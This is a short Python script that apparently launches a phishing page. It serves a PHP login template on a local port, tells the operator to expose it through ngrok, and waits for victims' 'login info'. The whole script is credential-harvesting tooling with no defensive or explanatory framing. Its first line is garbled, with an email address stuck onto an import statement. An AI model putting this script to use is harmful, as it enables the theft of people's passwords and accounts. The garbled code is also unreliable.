import os eshogbenga2018@gmail.com
import sys
try:
	port = sys.argv[1]
except Exception:
	port = "8080"

class bcolors:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
print(bcolors.BLUE+"Run "+bcolors.YELLOW+"ngrok http localhost: "+port+bcolors.BLUE+" in new terminal\n"+bcolors.END)
print("Waiting for login info...")

os.system("php -S localhost:"+port+" template.php > /dev/null 2>&1")

